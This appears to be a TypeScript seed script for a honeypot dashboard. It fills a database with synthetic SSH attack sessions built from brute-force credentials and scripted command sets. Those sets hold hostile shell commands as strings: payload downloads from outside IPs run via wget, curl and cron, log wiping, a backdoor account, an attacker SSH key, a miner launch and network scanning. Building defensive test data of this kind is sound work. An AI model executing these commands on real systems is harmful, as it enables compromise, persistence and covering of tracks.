/**
 * Honeypot test data seed
 * Run: cd apps/ingest-api && npx tsx prisma/seed.ts
 * Requires DATABASE_URL in .env or environment
 */

import { PrismaClient } from "@prisma/client"
import { randomUUID } from "crypto"

const prisma = new PrismaClient()

// ─── Helpers ──────────────────────────────────────────────────────────────────

function rand<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}
function randInt(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}
function randBool(prob = 0.5) {
  return Math.random() < prob
}
function daysAgo(d: number, jitterHours = 12): Date {
  const ms = Date.now() - d * 86_400_000 + randInt(0, jitterHours * 3_600_000)
  return new Date(ms)
}
function secondsAfter(base: Date, s: number): Date {
  return new Date(base.getTime() + s * 1000)
}
function cowrieId() {
  return randomUUID().replace(/-/g, "").slice(0, 32)
}

// ─── Static data ──────────────────────────────────────────────────────────────

const ATTACK_IPS: { ip: string }[] = [
  // China
  { ip: "1.180.217.43"    },
  { ip: "103.25.10.217"   },
  { ip: "221.194.47.208"  },
  { ip: "58.218.199.108"  },
  { ip: "103.99.0.122"    },
  { ip: "123.58.182.30"   },
  // Russia
  { ip: "5.8.18.243"      },
  { ip: "185.220.101.47"  },
  { ip: "91.108.4.41"     },
  // USA / VPS
  { ip: "104.236.198.48"  },
  { ip: "198.199.70.31"   },
  { ip: "192.241.214.15"  },
  // Netherlands (Tor / VPN)
  { ip: "185.220.100.240" },
  { ip: "195.154.179.7"   },
  // Germany
  { ip: "193.169.255.54"  },
  { ip: "85.209.11.227"   },
  // South Korea
  { ip: "175.45.176.0"    },
  { ip: "211.183.3.100"   },
  // Brazil
  { ip: "177.34.61.99"    },
  { ip: "189.6.56.212"    },
  // Vietnam
  { ip: "14.165.36.54"    },
  { ip: "117.4.237.102"   },
  // Taiwan
  { ip: "211.20.128.100"  },
  { ip: "118.163.74.160"  },
  // India
  { ip: "103.217.241.147" },
  { ip: "49.36.108.193"   },
  // Turkey
  { ip: "176.234.123.45"  },
  // Ukraine
  { ip: "91.219.236.179"  },
  // Iran
  { ip: "5.160.218.172"   },
]

const HASSH_FINGERPRINTS = [
  "92674389fa1e47a27ddd8d9b63ecd42b",  // Paramiko (Python)
  "b12d2871a1189eff20364cf5333619ee",  // OpenSSH default
  "6d1f4b0a7bde04b4b8b7c2e3a1d9f3c5",  // Mirai / botnet variant
  "ec7378c1a92f5a8eaa022728b2f3ec77",  // PuTTY
  "a7c4d3e9b1f2847e6c0d5a3b8e1f9c2d",  // Custom botnet
]

const CLIENT_VERSIONS = [
  "SSH-2.0-libssh2_1.9.0",
  "SSH-2.0-OpenSSH_8.2p1",
  "SSH-2.0-OpenSSH_7.4",
  "SSH-2.0-paramiko_2.9.2",
  "SSH-2.0-Go",
  "SSH-2.0-PUTTY",
  "SSH-2.0-OpenSSH_9.0",
]

const USERNAMES = [
  "root", "admin", "ubuntu", "pi", "user", "guest", "oracle",
  "postgres", "mysql", "nginx", "apache", "deploy", "test",
  "support", "operator", "ec2-user", "centos", "debian",
]

const PASSWORDS = [
  "123456", "password", "admin", "root", "1234", "qwerty",
  "admin123", "password1", "P@ssw0rd", "letmein", "welcome",
  "monkey", "dragon", "master", "123123", "abc123", "passwd",
  "ubuntu", "raspberry", "toor", "pass@123", "Admin@123",
]

// ─── Command sets ─────────────────────────────────────────────────────────────

const RECON = [
  "uname -a", "id", "whoami", "cat /etc/passwd", "cat /etc/issue",
  "ls -la /", "ps aux", "netstat -tlnp", "ip addr", "ifconfig",
  "df -h", "free -m", "cat /proc/cpuinfo", "env", "w",
  "last", "who", "uptime", "hostname",
]

const MALWARE_DROP = [
  "cd /tmp",
  "wget http://45.142.212.100/bins/bot.arm7 -O /tmp/.x",
  "curl -s http://185.220.101.47/payload -o /tmp/.cache",
  "chmod +x /tmp/.x",
  "/tmp/.x",
  "chmod 777 /tmp/.cache",
  "/tmp/.cache &",
  "rm -f /var/log/auth.log",
  "history -c",
  "echo '*/5 * * * * /tmp/.x' | crontab -",
  "cat /dev/null > /var/log/syslog",
]

const MINER_DROP = [
  "cd /tmp",
  "wget http://pool.minexmr.com/xmrig -O miner",
  "chmod +x miner",
  "./miner -o pool.minexmr.com:4444 -u 4ABC123wallet -p x &",
  "disown",
  "ps aux | grep miner",
  "nproc",
  "cat /proc/cpuinfo | grep 'model name'",
]

const PERSISTENCE = [
  "echo '* * * * * curl http://185.220.101.47/k|sh' >> /etc/crontab",
  "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config",
  "useradd -m -s /bin/bash -G sudo backdoor",
  "echo 'backdoor:hacked123' | chpasswd",
  "echo 'ssh-rsa AAAAB3N...attacker_key' >> /root/.ssh/authorized_keys",
  "systemctl enable ssh",
  "sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config",
]

const LATERAL = [
  "cat /root/.ssh/known_hosts",
  "for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i; done",
  "nmap -sn 10.0.0.0/24",
  "ssh -o StrictHostKeyChecking=no root@10.0.0.2",
  "cat /home/*/.ssh/known_hosts",
]

// ─── Session builder ──────────────────────────────────────────────────────────

interface SessionSpec {
  ip: string
  hassh?: string
  clientVersion?: string
  loginSuccess: boolean
  authAttempts: number
  commands: string[]
  daysBack: number
}

async function buildSession(spec: SessionSpec) {
  const username = rand(USERNAMES)
  const password = rand(PASSWORDS)
  const sessionId = randomUUID()
  const startedAt = daysAgo(spec.daysBack)

  const durationSec = spec.commands.length > 0
    ? randInt(spec.commands.length * 4, spec.commands.length * 20 + 60)
    : randInt(5, 45)
  const endedAt = secondsAfter(startedAt, durationSec)

  await prisma.session.create({
    data: {
      id: sessionId,
      cowrieSessionId: cowrieId(),
      srcIp: spec.ip,
      protocol: "ssh",
      username,
      password,
      loginSuccess: spec.loginSuccess,
      hassh: spec.hassh ?? rand(HASSH_FINGERPRINTS),
      clientVersion: spec.clientVersion ?? rand(CLIENT_VERSIONS),
      startedAt,
      endedAt,
    },
  })

  const events: Parameters<typeof prisma.event.createMany>["0"]["data"] = []
  let t = new Date(startedAt)

  const advance = (s: number) => { t = secondsAfter(t, s) }
  const addEvent = (
    type: string,
    extra: { message?: string; command?: string; username?: string; password?: string; success?: boolean } = {}
  ) => {
    events.push({
      id: randomUUID(),
      sessionId,
      eventType: type,
      eventTs: new Date(t),
      srcIp: spec.ip,
      message: extra.message ?? null,
      command: extra.command ?? null,
      username: extra.username ?? null,
      password: extra.password ?? null,
      success: extra.success ?? null,
      rawJson: {},
      normalizedJson: {},
      cowrieEventId: cowrieId(),
      cowrieTs: new Date(t).toISOString(),
    })
  }

  // Connect + handshake
  addEvent("session.connect", { message: `New connection: ${spec.ip}` })
  advance(1)
  addEvent("client.version", { message: spec.clientVersion ?? rand(CLIENT_VERSIONS) })
  advance(1)
  addEvent("client.kex", { message: `hassh=${spec.hassh ?? rand(HASSH_FINGERPRINTS)}` })
  advance(1)

  // Auth attempts
  const failCount = spec.loginSuccess ? spec.authAttempts - 1 : spec.authAttempts
  for (let i = 0; i < failCount; i++) {
    addEvent("auth.failed", { username: rand(USERNAMES), password: rand(PASSWORDS), success: false })
    advance(randInt(1, 3))
  }
  if (spec.loginSuccess) {
    addEvent("auth.success", { username, password, success: true })
    advance(randInt(1, 5))
  }

  // Commands
  for (const cmd of spec.commands) {
    addEvent("command.input", { command: cmd, message: cmd })
    advance(randInt(2, 15))
  }

  addEvent("session.closed", { message: "Connection lost" })

  await prisma.event.createMany({ data: events, skipDuplicates: true })
}

// ─── Main ─────────────────────────────────────────────────────────────────────

async function main() {
  console.log("🌱  Seeding honeypot test data...\n")

  console.log("  Clearing existing data...")
  await prisma.event.deleteMany()
  await prisma.session.deleteMany()

  let total = 0

  // ── 1. Brute-force botnet from China ─ same HASSH, no commands ──────────────
  console.log("  [1/7] Brute-force botnet (China, same HASSH)...")
  const botHashh = HASSH_FINGERPRINTS[2]
  const botClient = "SSH-2.0-libssh2_1.9.0"
  const botIps = ["1.180.217.43", "103.25.10.217", "221.194.47.208", "58.218.199.108"]
  for (const ip of botIps) {
    for (let d = 0; d < 8; d++) {
      await buildSession({
        ip, hassh: botHashh, clientVersion: botClient,
        loginSuccess: false,
        authAttempts: randInt(25, 60),
        commands: [],
        daysBack: d,
      })
      total++
    }
  }

  // ── 2. Malware dropper campaign ─ Russia/NL, shared command cluster ──────────
  console.log("  [2/7] Malware dropper campaign (RU, NL — behavioral cluster)...")
  const malwareIps = ["5.8.18.243", "185.220.101.47", "91.108.4.41", "185.220.100.240", "195.154.179.7"]
  const sharedDrop = [
    "cd /tmp",
    "wget http://45.142.212.100/bins/bot.arm7 -O /tmp/.x",
    "chmod +x /tmp/.x",
    "/tmp/.x",
    "echo '*/5 * * * * /tmp/.x' | crontab -",
    "history -c",
  ]
  for (const ip of malwareIps) {
    for (let rep = 0; rep < 4; rep++) {
      await buildSession({
        ip,
        loginSuccess: true,
        authAttempts: randInt(1, 3),
        commands: [...RECON.slice(0, 3), ...sharedDrop],
        daysBack: randInt(0, 15),
      })
      total++
    }
  }

  // ── 3. Crypto miner ─ Korea / Vietnam ────────────────────────────────────────
  console.log("  [3/7] Crypto miner sessions (KR, VN)...")
  const minerIps = ["175.45.176.0", "211.183.3.100", "14.165.36.54", "117.4.237.102"]
  for (const ip of minerIps) {
    for (let rep = 0; rep < 4; rep++) {
      await buildSession({
        ip,
        loginSuccess: true,
        authAttempts: randInt(1, 5),
        commands: MINER_DROP,
        daysBack: randInt(0, 30),
      })
      total++
    }
  }

  // ── 4. Interactive operator ─ manual recon + persistence ─────────────────────
  console.log("  [4/7] Interactive operators (BR, UA, DE)...")
  const interactiveIps = ["177.34.61.99", "189.6.56.212", "91.219.236.179", "193.169.255.54", "85.209.11.227"]
  for (const ip of interactiveIps) {
    await buildSession({
      ip,
      loginSuccess: true,
      authAttempts: randInt(1, 4),
      commands: [...RECON, ...LATERAL.slice(0, randInt(2, 4)), ...PERSISTENCE.slice(0, randInt(2, 4))],
      daysBack: randInt(0, 20),
    })
    total++
  }

  // ── 5. Credential stuffing ─ India / Taiwan / Turkey / Iran ──────────────────
  console.log("  [5/7] Credential stuffing (IN, TW, TR, IR)...")
  const stuffIps = ["103.217.241.147", "49.36.108.193", "211.20.128.100", "118.163.74.160", "176.234.123.45", "5.160.218.172"]
  for (const ip of stuffIps) {
    for (let rep = 0; rep < randInt(4, 10); rep++) {
      const success = randBool(0.08)
      await buildSession({
        ip,
        loginSuccess: success,
        authAttempts: randInt(3, 15),
        commands: success ? RECON.slice(0, randInt(2, 6)) : [],
        daysBack: randInt(0, 30),
      })
      total++
    }
  }

  // ── 6. Full malware + persistence (USA VPS, success + full chain) ─────────────
  console.log("  [6/7] Full attack chain — login success + persistence (US VPS)...")
  const fullChainIps = ["104.236.198.48", "198.199.70.31", "192.241.214.15"]
  for (const ip of fullChainIps) {
    await buildSession({
      ip,
      loginSuccess: true,
      authAttempts: randInt(2, 6),
      commands: [...RECON, ...MALWARE_DROP, ...PERSISTENCE],
      daysBack: randInt(0, 7),
    })
    total++
  }

  // ── 7. Opportunistic scanners ─ 1-3 attempts, no commands, 30 days ────────────
  console.log("  [7/7] Opportunistic scanners (all origins, 30 days)...")
  for (let d = 0; d < 30; d++) {
    const count = randInt(3, 8)
    for (let i = 0; i < count; i++) {
      await buildSession({
        ip: rand(ATTACK_IPS).ip,
        loginSuccess: false,
        authAttempts: randInt(1, 3),
        commands: [],
        daysBack: d,
      })
      total++
    }
  }

  // Summary
  const sessionCount = await prisma.session.count()
  const eventCount   = await prisma.event.count()
  const uniqueIps    = await prisma.session.findMany({ distinct: ["srcIp"], select: { srcIp: true } })

  console.log(`
✅  Seed complete!
    Sessions : ${sessionCount}
    Events   : ${eventCount}
    Unique IPs: ${uniqueIps.length}

    Open http://localhost:4000 to explore the data.
  `)
}

main()
  .catch((e) => { console.error(e); process.exit(1) })
  .finally(() => prisma.$disconnect())
